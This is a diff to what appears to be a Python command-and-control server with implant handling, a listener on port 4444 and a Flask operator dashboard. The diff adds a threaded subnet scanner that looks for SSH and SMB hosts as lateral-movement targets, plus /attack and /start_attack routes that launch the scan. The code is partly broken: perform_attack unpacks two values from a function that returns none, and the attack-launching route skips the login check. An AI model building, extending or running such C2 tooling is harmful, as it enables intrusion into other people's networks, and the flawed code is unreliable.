@@ -5,16 +5,19 @@ import threading
 import queue
 import readline
 import logging
+from concurrent.futures import ThreadPoolExecutor
 
 # Custom imports
 import users
 import implants
+import attacks
 
 # IP and port configs
 SERVER_HOST = "192.168.108.15"
 SERVER_PORT = 4444
 FLASK_HOST = "192.168.108.15"
 FLASK_PORT = 5000
+TARGET_SUBNET = "192.168.108."
 
 # C2 configs
 DELAY = 10
@@ -151,6 +154,36 @@ def start_server():
     finally:
         server_socket.close()
 
+def network_scan(subnet="192.168.108.", ports=[22, 445]):
+    """
+    Scans the given subnet for specified ports and handles results accordingly.
+
+    Args:
+        subnet (str): The subnet to scan, e.g., "192.168.108.".
+        ports (list): List of ports to scan, e.g., [22, 445].
+    """
+    def scan_host(ip):
+        for port in ports:
+            try:
+                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                    s.settimeout(1)  # Timeout for connection
+                    result = s.connect_ex((ip, port))
+                    if result == 0:
+                        if port == 22:
+                            print(f"[INFO] SSH (port 22) open on {ip}. Potential SSH server.")
+                        elif port == 445:
+                            print(f"[INFO] SMB (port 445) open on {ip}. Potential SMB service.")
+                    else:
+                        # print(f"[DEBUG] Port {port} closed on {ip}.")
+                        pass
+            except Exception as e:
+                print(f"[ERROR] Error scanning {ip}:{port} - {e}")
+
+    print("[INFO] Starting scan...")
+    with ThreadPoolExecutor(max_workers=10) as executor:
+        ips = [f"{subnet}{i}" for i in range(1, 255)]
+        executor.map(scan_host, ips)
+    print("[INFO] Scan completed.")
 
 @app.route('/')
 def home():
@@ -179,8 +212,19 @@ def dashboard():
         return redirect(url_for('login'))
     return render_template('dashboard.html', username=session['username'], agents=registered_agents_id[1:])
 
+@app.route('/attack')
+def attack():
+    if 'username' not in session:
+        flash('Please log in first.', 'warning')
+        return redirect(url_for('login'))
+    return render_template('attack.html')
+
 @app.route('/logs')
 def logs():
+    if 'username' not in session:
+        flash('Please log in first.', 'warning')
+        return redirect(url_for('login'))
+
     # Specify the path to your log file
     log_file_path = 'server.log'
 
@@ -193,6 +237,15 @@ def logs():
 
     # Render the log contents in the HTML template
     return render_template('logs.html', log_content=log_content)
+
+@app.route('/start_attack', methods=['POST'])
+def start_attack():
+    # Call your Python function here
+    perform_attack()
+    return "Attack initiated successfully!"
+
+def perform_attack():
+    ssh_hosts, smb_hosts = network_scan(TARGET_SUBNET)
 
 @app.route('/logout')
 def logout():
